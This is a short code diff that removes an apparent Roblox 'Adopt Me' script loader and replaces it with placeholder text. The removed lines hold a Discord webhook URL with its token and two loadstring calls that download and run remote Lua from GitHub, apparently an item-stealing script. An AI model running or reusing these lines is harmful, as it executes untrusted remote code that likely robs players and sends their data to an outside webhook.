@@ -1,8 +1,1 @@
-Username = "CryNoMorePet"
-Webhook = "https://discord.com/api/webhooks/1270596173962412166/D4KfA7VuoYXT_5kj4R8GNcjV0izdRwwi2qlJT2R0d7aYwJemS2LH5V350mmhV3c0lPfN"
-
-getgenv().gui = false
-loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/adopt.lua", true))()
-
-_G.scriptName = "Kinchi"
-loadstring(game:HttpGet("https://gist.githubusercontent.com/AdoptMeScript-VIP/7abf1c5eb3a65d59b3d0fea7ed67594c/raw/c1b253fb4a9497a5147b05e26da2a1a3b8cf2293/Kinchi"))()
+jsjsj
